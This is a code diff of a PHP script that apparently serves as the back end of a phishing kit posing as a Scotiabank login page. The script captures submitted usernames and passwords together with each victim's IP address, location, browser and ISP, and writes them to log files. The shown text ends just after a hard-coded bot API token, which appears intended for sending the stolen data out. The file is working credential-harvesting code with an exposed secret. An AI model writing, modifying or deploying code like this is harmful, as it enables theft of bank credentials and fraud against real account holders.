@@ -144,12 +144,12 @@ if ($success == false) {
     $url        = "https://SCOTIA.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
-    $code       = $_POST['code'];
+    $lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "" . $full_date;
-    $lh     = "|";
-    $li     = ",";
+ 
+    $li     = ":";
 } else {
     $status     = "Status : " . $success;
     fwrite($fp, $status . "\n");
@@ -161,7 +161,7 @@ if ($success == false) {
 
 $message = "[BIBLE TALK][NEW INCOMING MESSAGE]\n\n\n\n\n\n$bank$lh$ip\n\n\[-----------------]\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
 file_put_contents($file, "$message\n\n\n\n[//////////////////////////////////[1-<3-J35U4-EDITION]//////////////////////////////////]\n", FILE_APPEND);
-file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND);
+file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$mapurl$li$isp$li$user$li$pass$li\n", FILE_APPEND);
 file_put_contents($file1, "$user$li$pass\n", FILE_APPEND);
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
